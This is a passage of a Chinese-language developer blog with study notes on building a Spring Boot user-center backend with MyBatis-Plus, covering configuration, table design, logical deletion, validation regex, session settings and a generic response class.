class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">user-center</span></span><br><span class="line">    <span class="comment"># DataSource Config</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.cj.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/yourdatabase</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">yourname</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">yourpwd</span></span><br><span class="line"><span class="attr">server:</span></span><br><span class="line">  <span class="attr">port:</span> <span class="number">8080</span></span><br></pre></td></tr></table></figure><h4 id="Mybatis-plus"><a href="#Mybatis-plus" class="headerlink" title="Mybatis-plus"></a>Mybatis-plus</h4><p>新接触的技术文档学会去官网逐步学习.</p><h4 id="Resource和Autowired区别"><a href="#Resource和Autowired区别" class="headerlink" title="Resource和Autowired区别"></a>Resource和Autowired区别</h4><p>Resouce默认按照Bean对象名称进行注入，如果无法通过名称匹配则会按照类型注入.只能在Spring容器中使用.<br>Autowired默认按照类型注入如果有多个符合条件的Bean（多于一个匹配类型）可以结合@Qualifier注解按名称指定.</p><table><thead><tr><th>属性</th><th><code>@Resource</code></th><th><code>@Autowired</code></th></tr></thead><tbody><tr><td><strong><code>name</code></strong></td><td>支持，按名称注入</td><td>不支持</td></tr><tr><td><strong><code>type</code></strong></td><td>支持，按类型注入</td><td>不支持</td></tr><tr><td><strong><code>required</code></strong></td><td>不支持</td><td>支持，默认 <code>required=true</code>，可设置为 <code>false</code></td></tr></tbody></table><p><strong>推荐使用Resource</strong>.</p><h4 id="Runwith注解"><a href="#Runwith注解" class="headerlink" title="@Runwith注解"></a>@Runwith注解</h4><p><img src="/../imgs/2025-01/image-20250113211506790.png" alt="image-20250113211506790"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RunWith(SpringRunner.class)</span></span><br></pre></td></tr></table></figure><p>使用@Runwith注解可解决注入对象为NULL问题</p><h4 id="Mapper和-MapperScan"><a href="#Mapper和-MapperScan" class="headerlink" title="@Mapper和@MapperScan"></a>@Mapper和@MapperScan</h4><p><img src="/../imgs/2025-01/image-20250113211801210.png" alt="image-20250113211801210"></p><p>主配置文件中使用@MapperScan注解等价于在mapper接口（scan扫描定义的路径就是包含扫描到mapper包下所有内容）</p><p><img src="/../imgs/2025-01/image-20250113211842054.png" alt="image-20250113211842054"></p><p><strong>当然前提都要保证配置文件【pom.xml没问题】</strong></p><table><thead><tr><th><strong>Spring Boot 版本</strong></th><th><strong>MyBatis-Plus 版本</strong></th><th><strong>MyBatis 版本</strong></th><th><strong>MySQL 驱动版本</strong></th><th><strong>MySQL 数据库版本</strong></th></tr></thead><tbody><tr><td>3.1.x</td><td>3.5.x</td><td>3.5.x</td><td>8.0.33 - 8.0.34</td><td>5.7.x &#x2F; 8.0.x</td></tr><tr><td>3.0.x</td><td>3.5.x</td><td>3.5.x</td><td>8.0.33 - 8.0.34</td><td>5.7.x &#x2F; 8.0.x</td></tr><tr><td>2.7.x</td><td>3.5.x</td><td>3.5.x</td><td>8.0.30 - 8.0.33</td><td>5.7.x &#x2F; 8.0.x</td></tr><tr><td>2.6.x</td><td>3.4.x - 3.5.x</td><td>3.4.x - 3.5.x</td><td>8.0.28 - 8.0.33</td><td>5.7.x &#x2F; 8.0.x</td></tr><tr><td>2.5.x</td><td>3.4.x</td><td>3.4.x</td><td>8.0.28 - 8.0.31</td><td>5.7.x &#x2F; 8.0.x</td></tr><tr><td>2.4.x</td><td>3.4.x</td><td>3.4.x</td><td>8.0.26 - 8.0.29</td><td>5.7.x &#x2F; 8.0.x</td></tr><tr><td>2.3.x</td><td>3.3.x</td><td>3.3.x</td><td>8.0.22 - 8.0.27</td><td>5.7.x &#x2F; 8.0.x</td></tr></tbody></table><p><strong>注意拉下来框架之后自己配置好MySQL对应依赖的content</strong></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">java.version</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">java.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">spring-boot.version</span>&gt;</span>2.6.13<span class="tag">&lt;/<span class="name">spring-boot.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mybatis-plus.version</span>&gt;</span>3.5.9<span class="tag">&lt;/<span class="name">mybatis-plus.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mysql-connector.version</span>&gt;</span>8.0.33<span class="tag">&lt;/<span class="name">mysql-connector.version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">project.reporting.outputEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.reporting.outputEncoding</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="数据表设计"><a href="#数据表设计" class="headerlink" title="数据表设计"></a>数据表设计</h4><table><thead><tr><th>特性</th><th><code>CHAR</code></th><th><code>VARCHAR</code></th></tr></thead><tbody><tr><td><strong>长度</strong></td><td>固定长度，无论实际内容多少</td><td>可变长度，仅存储实际内容</td></tr><tr><td><strong>存储空间</strong></td><td>占用固定空间，可能浪费存储</td><td>更节省空间，但有额外长度信息开销</td></tr><tr><td><strong>性能</strong></td><td>定长，性能更高</td><td>可变长度，性能略低</td></tr><tr><td><strong>适用场景</strong></td><td>长度固定的数据（如身份证号）</td><td>长度可变的数据（如用户名）</td></tr><tr><td><strong>尾部空格处理</strong></td><td>存储时补足空格，查询时忽略</td><td>存储时不 补足空格，查询时需精确匹配</td></tr><tr><td><strong>最大长度</strong></td><td>255 字符</td><td>65535 字节</td></tr></tbody></table><p>多留余地万一以后要修改 <strong>varchar！</strong></p><table><thead><tr><th>特性</th><th><code>INT</code></th><th><code>TINYINT</code></th></tr></thead><tbody><tr><td><strong>存储空间</strong></td><td>4 字节</td><td>1 字节</td></tr><tr><td><strong>取值范围（有符号）</strong></td><td>-2,147,483,648 ~ 2,147,483,647</td><td>-128 ~ 127</td></tr><tr><td><strong>取值范围（无符号）</strong></td><td>0 ~ 4,294,967,295</td><td>0 ~ 255</td></tr><tr><td><strong>适用场景</strong></td><td>大范围数据（如主键、自增 ID）</td><td>小范围数据（如状态、布尔值）</td></tr><tr><td><strong>性能</strong></td><td>处理速度略低，存储空间更大</td><td>存储效率高，适合小范围高效存储</td></tr></tbody></table><p>可以多使用tinyint 避免浪费空间.</p><p><strong>什么时候需要索引</strong></p><table><thead><tr><th><strong>场景</strong></th><th><strong>是否设计索引</strong></th></tr></thead><tbody><tr><td>高频查询的列</td><td>✅ 需要</td></tr><tr><td>作为主键或唯一性约束的列</td><td>✅ 需要</td></tr><tr><td>经常排序、分组的列</td><td>✅ 需要</td></tr><tr><td>大表中的查询条件列</td><td>✅ 需要</td></tr><tr><td>小表、数据量很少的表</td><td>❌ 不需要</td></tr><tr><td>写操作非常频繁的表</td><td>❌ 避免过多索引</td></tr><tr><td>低选择性的列（重复值较多）</td><td>❌ 一般不需要</td></tr><tr><td>从不在查询条件中出现的列</td><td>❌ 不需要</td></tr></tbody></table><p>在实际设计中，应结合业务需求和数据分布情况，合理设计索引以平衡性能与存储开销。</p><h4 id="DELETE-与-TRUNCATE-的差异总结"><a href="#DELETE-与-TRUNCATE-的差异总结" class="headerlink" title="DELETE 与 TRUNCATE 的差异总结"></a>DELETE 与 TRUNCATE 的差异总结</h4><table><thead><tr><th><strong>特性</strong></th><th><strong>DELETE</strong></th><th><strong>TRUNCATE</strong></th></tr></thead><tbody><tr><td><strong>类型</strong></td><td>DML（数据操作语言）</td><td>DDL（数据定义语言）</td></tr><tr><td><strong>作用范围</strong></td><td>可以带 <code>WHERE</code> 条件，删除部分或全部数据</td><td>删除表中所有数据，无法带条件</td></tr><tr><td><strong>触发器</strong></td><td>会触发触发器</td><td>不会触发触发器</td></tr><tr><td><strong>日志记录</strong></td><td>逐行记录删除操作，记录到事务日志中</td><td>不逐行记录，操作速度快</td></tr><tr><td><strong>事务支持</strong></td><td>支持事务，可以回滚</td><td>大多数数据库中不支持事务，操作不可回滚</td></tr><tr><td><strong>性能</strong></td><td>慢，逐行删除，记录日志</td><td>快，直接清空表</td></tr><tr><td><strong>表结构</strong></td><td>表结构、列、索引保留</td><td>表结构、列、索引保留</td></tr><tr><td><strong>AUTO_INCREMENT 重置</strong></td><td>不会重置 AUTO_INCREMENT</td><td>会重置 AUTO_INCREMENT</td></tr><tr><td><strong>使用场景</strong></td><td>删除部分数据或在事务中操作</td><td>清空表中所有数据，高效快速地删除大批量数据</td></tr></tbody></table><p>id由数据库分配-&gt;auto</p><p><img src="/../imgs/2025-01/image-20250113222854939.png" alt="image-20250113222854939"></p><h4 id="自动生成器使用"><a href="#自动生成器使用" class="headerlink" title="自动生成器使用"></a>自动生成器使用</h4><p>MybatisX插件自动根据数据库生成domain实体对象、mapper（操作数据库的对象）、mapper.xml（定义了mapper对象和数据库的关联，可以在其中写自己的SQL）、service（包含常用的增删改查，可能被复用的方法都可以写到service中）、serviceImpl（实现具体service）</p><p>使用Mybatisx插件自动生成需要的类【右键表名】</p><p><img src="/../imgs/2025-01/image-20250114124902816.png" alt="image-20250114124902816"></p><p><img src="/../imgs/2025-01/image-20250114125026113.png" alt="image-20250114125026113"></p><p>根据Mybatisplus和Mybatis框架机制 会自动帮我们生成需要的Id（用户新增的ID会把塞到user表中）<br><img src="/../imgs/2025-01/image-20250114131948027.png" alt="image-20250114131948027"></p><h4 id="Mybatis-Plus默认转换机制"><a href="#Mybatis-Plus默认转换机制" class="headerlink" title="Mybatis-Plus默认转换机制"></a>Mybatis-Plus默认转换机制</h4><p>写了service的Test</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yub.usercenter.service;</span><br><span class="line"><span class="keyword">import</span> java.util.Date;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.yub.usercenter.model.domain.User;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Assertions;</span><br><span class="line"><span class="keyword">import</span> org.junit.jupiter.api.Test;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.test.context.SpringBootTest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.annotation.Resource;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 用户服务测试</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@author</span> yub</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@SpringBootTest</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceTest</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserService userService;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Test</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">tesAddUser</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        user.setUsername(<span class="string">&quot;yub&quot;</span>);</span><br><span class="line">        user.setUserAccount(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        user.setAvatarUrl(<span class="string">&quot;https://tse3-mm.cn.bing.net/th/id/OIP-C.4RGfXFhVnIgc2CyGw-I9XAAAAA?w=208&amp;h=208&amp;c=7&amp;r=0&amp;o=5&amp;dpr=1.3&amp;pid=1.7&quot;</span>);</span><br><span class="line">        user.setGender(<span class="number">1</span>);</span><br><span class="line">        user.setUserPassword(<span class="string">&quot;xxx&quot;</span>);</span><br><span class="line">        user.setPhone(<span class="string">&quot;123&quot;</span>);</span><br><span class="line">        user.setEmail(<span class="string">&quot;456&quot;</span>);</span><br><span class="line">        <span class="type">boolean</span> <span class="variable">result</span> <span class="operator">=</span> userService.save(user);</span><br><span class="line">        System.out.println(user.getId());</span><br><span class="line">        Assertions.assertTrue(result);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>出现报错 查看官方文档<br><img src="/../imgs/2025-01/image-20250114132807433.png" alt="image-20250114132807433"></p><h3 id="mapUnderscoreToCamelCase"><a href="#mapUnderscoreToCamelCase" class="headerlink" title="mapUnderscoreToCamelCase"></a>mapUnderscoreToCamelCase</h3><ul><li><strong>类型</strong>：<code>boolean</code></li><li><strong>默认值</strong>：<code>true</code></li></ul><p>开启自动驼峰命名规则（camel case）映射，即从经典数据库列名 A_COLUMN（下划线命名） 到经典 Java 属性名 aColumn（驼峰命名） 的类似映射。</p><p><strong>配置示例</strong>：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mybatis-plus:</span><br><span class="line">  configuration:</span><br><span class="line">    map-underscore-to-camel-case: true</span><br></pre></td></tr></table></figure><p><strong>提示</strong></p><p>在 MyBatis-Plus 中，此属性也将用于生成最终的 SQL 的 select body。如果您的数据库命名符合规则，无需使用 <code>@TableField</code> 注解指定数据库字段名。</p><h4 id="Mybatis-Plus默认删除机制"><a href="#Mybatis-Plus默认删除机制" class="headerlink" title="Mybatis-Plus默认删除机制"></a>Mybatis-Plus默认删除机制</h4><p>MyBatis-Plus 的逻辑删除功能会在执行数据库操作时自动处理逻辑删除字段。以下是它的工作方式：</p><ul><li><strong>插入</strong>：逻辑删除字段的值不受限制。</li><li><strong>查找</strong>：自动添加条件，过滤掉标记为已删除的记录。</li><li><strong>更新</strong>：防止更新已删除的记录。</li><li><strong>删除</strong>：将删除操作转换为更新操作，标记记录为已删除。</li></ul><h2 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h2><h3 id="步骤-1-配置全局逻辑删除属性"><a href="#步骤-1-配置全局逻辑删除属性" class="headerlink" title="步骤 1: 配置全局逻辑删除属性"></a>步骤 1: 配置全局逻辑删除属性</h3><p>在 <code>application.yml</code> 中配置 MyBatis-Plus 的全局逻辑删除属性：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">mybatis-plus:</span><br><span class="line">  global-config:</span><br><span class="line">    db-config:</span><br><span class="line">      logic-delete-field: deleted # 全局逻辑删除字段名</span><br><span class="line">      logic-delete-value: 1 # 逻辑已删除值</span><br><span class="line">      logic-not-delete-value: 0 # 逻辑未删除值</span><br></pre></td></tr></table></figure><h3 id="步骤-2-在实体类中使用-TableLogic-注解"><a href="#步骤-2-在实体类中使用-TableLogic-注解" class="headerlink" title="步骤 2: 在实体类中使用 @TableLogic 注解"></a>步骤 2: 在实体类中使用 <code>@TableLogic</code> 注解</h3><p>在实体类中，对应数据库表的逻辑删除字段上添加 <code>@TableLogic</code> 注解：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.baomidou.mybatisplus.annotation.TableLogic;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;    <span class="comment">// 其他字段...</span></span><br><span class="line">    <span class="meta">@TableLogic</span>    <span class="keyword">private</span> Integer deleted;&#125;</span><br></pre></td></tr></table></figure><h3 id="MyBatis-Plus-逻辑删除-vs-物理删除-区别表"><a href="#MyBatis-Plus-逻辑删除-vs-物理删除-区别表" class="headerlink" title="MyBatis-Plus 逻辑删除 vs 物理删除 区别表"></a><strong>MyBatis-Plus 逻辑删除 vs 物理删除 区别表</strong></h3><table><thead><tr><th><strong>对比项</strong></th><th><strong>逻辑删除</strong></th><th><strong>物理删除</strong></th></tr></thead><tbody><tr><td><strong>定义</strong></td><td>不真正从数据库中删除记录，而是通过标识字段（如 <code>is_deleted</code>）标记记录已被删除。</td><td>直接从数据库中物理移除记录，记录彻底消失。</td></tr><tr><td><strong>是否保留数据</strong></td><td>数据仍然保留在数据库中，只是被标记为“已删除”，不会在查询中返回（默认情况下）。</td><td>数据从数据库中完全移除，无法恢复。</td></tr><tr><td><strong>实现方式</strong></td><td>- 依赖 MyBatis-Plus 的全局逻辑删除功能，通过配置逻辑删除字段（如 <code>deleted</code>）实现过滤逻辑。<br>- 在执行查询时，自动附加 <code>WHERE deleted = 0</code> 条件。</td><td>- 直接执行 <code>DELETE FROM table WHERE ...</code>，彻底删除记录。</td></tr><tr><td><strong>配置要求</strong></td><td>- 需要在实体类上添加逻辑删除字段（如 <code>@TableLogic</code> 注解）。<br>- 配置全局逻辑删除策略。</td><td>无额外配置，直接通过 MyBatis 或 MyBatis-Plus 的 <code>delete</code> 方法执行 SQL 删除操作。</td></tr><tr><td><strong>恢复数据</strong></td><td>可以通过更新逻辑删除标记字段（如将 <code>deleted</code> 从 <code>1</code> 改为 <code>0</code>）恢复数据。</td><td>删除的数据无法恢复，除非通过数据库备份还原。</td></tr><tr><td><strong>应用场景</strong></td><td>- 适用于需要保留历史数据以供审计或恢复的场景，例如：订单管理系统、用户管理系统中的账号停用功能。</td><td>- 适用于对数据一致性要求高、不需要保留任何删除痕迹的场景，例如：临时数据、无用数据的清理场景。</td></tr><tr><td><strong>SQL 性能</strong></td><td>查询时额外增加了过滤条件 <code>WHERE deleted = 0</code>，可能会略微影响性能，尤其是在数据量较大的情况下。</td><td>没有额外的过滤条件，查询性能更高，但没有保留数据的能力。</td></tr><tr><td><strong>法律&#x2F;合规性要求</strong></td><td>满足部分行业中对数据不可随意删除的合规性要求，例如金融系统、医疗系统等。</td><td>无法满足保留历史记录的法务合规要求，适合非监管场景下的数据删除。</td></tr></tbody></table><p><strong>复杂重复的校验使用工具Apache Commons Lang</strong><br><img src="/../imgs/2025-01/image-20250114135218842.png" alt="image-20250114135218842"></p><p><strong>用于校验用户账号是否出现特殊字符的正则表达式</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//匹配 标点符号 (\pP)、符号字符 (\pS) 或 一个或多个空白字符 (\s+)。</span></span><br><span class="line"><span class="string">&quot;\\pP|\\pS|\\s+&quot;</span></span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a><strong>总结</strong></h3><ol><li><code>&quot;\\pP|\\pS|\\s+&quot;</code> 使用 Unicode 属性匹配字符，比 <code>[^a-zA-Z0-9_]</code> 更加精准和丰富。</li><li>如果需要明确匹配标点符号、符号字符和空白，可以使用 <code>&quot;\\pP|\\pS|\\s+&quot;</code>。</li><li>如果只需要简单排除非法字符（不属于某些范围的字符），可以使用 <code>[^a-zA-Z0-9_]</code>。</li></ol><h4 id="自动装箱和拆箱"><a href="#自动装箱和拆箱" class="headerlink" title="自动装箱和拆箱"></a><strong>自动装箱和拆箱</strong></h4><table><thead><tr><th><strong>特性</strong></th><th><strong>自动装箱</strong></th><th><strong>自动拆箱</strong></th></tr></thead><tbody><tr><td><strong>方向</strong></td><td>基本数据类型 → 包装类</td><td>包装类 → 基本数据类型</td></tr><tr><td><strong>触发场景</strong></td><td>需要对象时，例如赋值给包装类变量或添加到集合中</td><td>需要基本类型时，例如参与运算或赋值给基本类型变量</td></tr><tr><td><strong>主要方法实现</strong></td><td>调用包装类的 <code>valueOf()</code> 方法</td><td>调用包装类的 <code>xxxValue()</code> 方法（如 <code>intValue()</code>）</td></tr><tr><td><strong>示例代码</strong></td><td><code>Integer integer = 10;</code> &#x2F;&#x2F; 等价于 <code>Integer.valueOf(10)</code></td><td><code>int value = integer;</code> &#x2F;&#x2F; 等价于 <code>integer.intValue()</code></td></tr><tr><td><strong>作用</strong></td><td>将基本数据类型变为对象，用于集合或对象需求场景</td><td>将对象转为基本类型，用于计算或基本类型需求场景</td></tr><tr><td><strong>注意点</strong></td><td>频繁装箱会有性能开销，可能导致产生大量对象</td><td>包装类是 <code>null</code> 时，会引发 <code>NullPointerException</code></td></tr><tr><td><strong>集合框架操作</strong></td><td><code>List&lt;Integer&gt; list = new ArrayList&lt;&gt;();</code></td><td><code>int value = list.get(0);</code></td></tr><tr><td><strong>对象赋值</strong></td><td><code>Integer integer = 10;</code></td><td><code>int num = integer;</code></td></tr><tr><td><strong>算术运算</strong></td><td><code>Integer a = 5; Integer b = 10; Integer sum = a + b;</code></td><td>在运算时，<code>a</code> 和 <code>b</code>会拆箱为 <code>int</code> 类型并执行计算</td></tr><tr><td><strong>方法调用</strong></td><td>传递基本类型参数，包装类参数会自动装箱</td><td>方法返回包装类对象，接收者为基本类型会自动拆箱</td></tr></tbody></table><p><img src="/../imgs/2025-01/image-20250114163625145.png" alt="image-20250114163625145"></p><p><img src="/../imgs/2025-01/image-20250114165428279.png" alt="image-20250114165428279"></p><p><strong>小Tip</strong><br>使用mapper注入思路更清晰，但功能不如直接使用ServiceImp继承全面.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">UserServiceImpl</span> <span class="keyword">extends</span> <span class="title class_">ServiceImpl</span>&lt;UserMapper, User&gt;</span><br><span class="line">    <span class="keyword">implements</span> <span class="title class_">UserService</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Resource</span></span><br><span class="line">    <span class="keyword">private</span> UserMapper userMapper;          </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="comment">//账号不能重复</span></span><br><span class="line">        QueryWrapper&lt;User&gt; queryWrapper = <span class="keyword">new</span> <span class="title class_">QueryWrapper</span>&lt;&gt;();</span><br><span class="line">        queryWrapper.eq(<span class="string">&quot;userAccount&quot;</span>, userAccount);</span><br><span class="line">        <span class="comment">//这里的this其实就是UserServiceImpl拥有继承的父类的所有可继承的方法</span></span><br><span class="line">        <span class="comment">// long count = this.count(queryWrapper); </span></span><br><span class="line">       <span class="comment">//上一行是直接使用继承的父类的功能的等价于使用Usermapper注入</span></span><br><span class="line">        <span class="type">long</span> <span class="variable">count</span> <span class="operator">=</span> userMapper.selectCount(queryWrapper);</span><br><span class="line">        <span class="keyword">if</span>(count &gt; <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure><p>请求参数很长的时候不建议用get【限流 获取IP 同一个IP登录过多次 封号】<br>校验 存储<br>使用JSON格式的话最好封装一个对象 单独储存参数<br><img src="/../imgs/2025-01/image-20250115110534408.png" alt="image-20250115110534408"></p><p>大体积对象变成小体积（使用序列化），节省数据传输时间</p><h4 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h4><p>编写测试样例时，安装GenerateAllSetter插件可以快速生成默认值代码.<br><img src="/../imgs/2025-01/image-20250120220908304.png" alt="image-20250120220908304"></p><h4 id="IDEA自带的测试工具"><a href="#IDEA自带的测试工具" class="headerlink" title="IDEA自带的测试工具"></a>IDEA自带的测试工具</h4><p><img src="/../imgs/2025-01/image-20250115115048677.png" alt="image-20250115115048677"></p><p><img src="/../imgs/2025-01/image-20250115115322123.png" alt="image-20250115115322123"></p><h4 id="session一天失效"><a href="#session一天失效" class="headerlink" title="session一天失效"></a>session一天失效</h4><table><thead><tr><th>特性</th><th>Session</th><th>Cookie</th></tr></thead><tbody><tr><td><strong>存储位置</strong></td><td>数据存储在服务器端，客户端只保存Session ID</td><td>数据存储在客户端浏览器中</td></tr><tr><td><strong>生命周期</strong></td><td>通常与会话相关，浏览器关闭或超时后失效</td><td>可以设置过期时间，也可以是会话级的</td></tr><tr><td><strong>安全性</strong></td><td>更安全，因为数据保存在服务器端，不易被篡改</td><td>较不安全，易受攻击（如XSS、劫持等），敏感信息不宜存储</td></tr><tr><td><strong>数据类型</strong></td><td>可以存储复杂的数据结构</td><td>只能存储字符串类型的数据</td></tr><tr><td><strong>传输数据量</strong></td><td>只传输Session ID，传输量小，性能较高</td><td>传输全部数据，可能增加网络开销</td></tr><tr><td><strong>服务器负担</strong></td><td>需要服务器资源来存储Session数据</td><td>不占用服务器资源，减轻服务器负担</td></tr><tr><td><strong>适用场景</strong></td><td>适用于需要处理敏感信息或复杂数据的场景</td><td>适用于存储客户端简单数据（如用户偏好）或跟踪用户行为</td></tr></tbody></table><p>在application.yml文件下配置session</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">spring:</span></span><br><span class="line">  <span class="attr">application:</span></span><br><span class="line">    <span class="attr">name:</span> <span class="string">user-center</span></span><br><span class="line">    <span class="comment"># DataSource Config</span></span><br><span class="line">  <span class="attr">datasource:</span></span><br><span class="line">    <span class="attr">driver-class-name:</span> <span class="string">com.mysql.jdbc.Driver</span></span><br><span class="line">    <span class="attr">url:</span> <span class="string">jdbc:mysql://localhost:3306/yourdatabase</span></span><br><span class="line">    <span class="attr">username:</span> <span class="string">yourname</span></span><br><span class="line">    <span class="attr">password:</span> <span class="string">yourpwd</span></span><br><span class="line">  <span class="attr">session:</span></span><br><span class="line">    <span class="attr">timeout:</span> <span class="number">86400</span></span><br></pre></td></tr></table></figure><p>通用类型data，使用泛型.不管接口返回的内容类型是什么都可以兼容.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.yub.usercenter.common;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BaseResponse</span>&lt;T&gt; <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> code;</span><br><span class="line">    <span class="keyword">private</span> T data;</span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><table><thead><tr><th>类名</th><th>作用描述</th><th>主要功能</th></tr></thead><tbody><tr><td><code>BaseResponse</code></td><td>通用返回类，用于封装API响应数据，包含状态码、数据、消息和描述等信息。</td><td>提供多种构造方法以适应不同的返回类型。</td></tr><tr><td><code>ErrorCode</code></td><td>错误码枚举类，定义了常见的错误类型及其对应的状态码、消息和描述。</td><td>管理和提供标准化的错误码信息。</td></tr><tr><td><code>ResultsUtils</code></td><td>返回工具类，提供便捷的方法创建标准化的响应对象，简化响应构造过程。</td><td>提供<code>success</code>和多种<code>error</code>方法用于生成响应。</td></tr></tbody></table><p><strong><code>BaseResponse</code> 